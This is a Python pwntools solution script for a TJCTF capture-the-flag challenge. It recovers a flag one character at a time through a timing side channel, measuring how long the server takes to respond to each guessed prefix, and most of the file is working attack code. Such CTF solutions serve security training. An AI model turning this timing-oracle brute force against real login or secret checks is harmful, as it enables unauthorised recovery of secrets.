#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or 'problem1.tjctf.org'
port = int(args.PORT or 8003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

from time import time
count = 1000000

def test(c):
    log.info("STRING " + c)
    io = start()
    io.sendlineafter('?', str(count))
    io.sendlineafter(':', c)
    start_time = time()
    io.recv()
    resp = io.recv()
    end_time = time()
    if "failed" not in resp:
        print ("FUUUUUUUUUUUUUUUUUUUUUUUUUCK")
        print (c)
        exit()
    latency = end_time - start_time
    io.close()
    return latency

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def worker((to_send, times, cnt, lock)):
    for i in range (cnt):
        local_times = {}
        log.info("ITERATION " + str(i))
        for c in to_send:
            latency = test(c)
            try:
                local_times[c] += latency
            except:
                local_times[c] = latency

        lock.acquire()
        for k in local_times:
            try:
                times[k] += local_times[k]
            except:
                times[k] = local_times[k]
        lock.release()

from multiprocessing import Manager, Pool
# multithreading is not needed anymore, but I won't remove it just because I am lazy

def bf_letter(flag):
    manager = Manager()
    times = manager.dict()
    lock = manager.Lock()
    cnt = 1
    workers = 1

    to_send = []
    for i in range(32, 128):
        to_send.append(flag + chr(i))

    pool = Pool(workers)
    data = []
    for i in range(workers):
        data.append([to_send, times, cnt, lock])
    pool.map(worker, data)

    print ("\n\n\n\n DOOOOOOOOOOOOOOOOOOOOOONE")
    times = dict(times)
    for k in times:
        times[k] /= cnt * workers
    for key, value in sorted(times.iteritems(), key=lambda (k,v): (v,k), reverse = True):
        print "%s: %s" % (key, value)
        return key[-1]

flag = 'Tk'
while True:
    letter = bf_letter(flag)
    flag += letter
